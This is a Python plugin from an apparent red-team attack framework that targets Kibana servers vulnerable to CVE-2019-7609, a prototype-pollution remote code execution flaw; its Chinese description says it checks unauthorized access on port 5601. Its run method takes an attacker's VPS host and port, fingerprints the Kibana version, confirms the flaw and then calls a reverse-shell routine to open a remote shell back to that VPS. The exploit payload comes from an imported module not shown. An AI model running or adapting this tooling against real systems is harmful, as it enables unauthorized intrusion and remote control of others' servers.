from plugins.lib.kibana.CVE_2019_7609 import reverse_shell, verify, get_kibana_version
from plugins.plugin import Plugin


class RTPlugin(Plugin):
    def __init__(self):
        super().__init__()
        self.name = "kibana_unauthorized"
        self.type = self.URL_SHELL
        self.desc = "Kibana 为 Elassticsearch " \
                    "设计的一款开源的视图工具。其5.6.15和6.6.1之前的版本中存在一处原型链污染漏洞，利用这个漏洞我们可以在目标服务器上执行任意JavaScript" \
                    "代码。此插件主要检测未授权的情况，默认端口5601 "

    def _run(self):
        _ = self.vps.split(":")
        host = _[0]
        port = _[1]
        self.log(f"发送请求：{self.url},反弹shell vps host:{host} 端口：{port}")
        version = get_kibana_version(self.url)
        result = verify(self.url,version)
        if result:
            print("[+] {} maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability".format(self.url))
            result = reverse_shell(self.url, host, port, version)
            if result:
                self.log(
                    " reverse shell completely! please check session on: {}:{}".format(host, port))
            else:
                self.log(" cannot reverse shell")
        else:
            self.log("{} do not exists CVE-2019-7609 vulnerability".format(self.host))
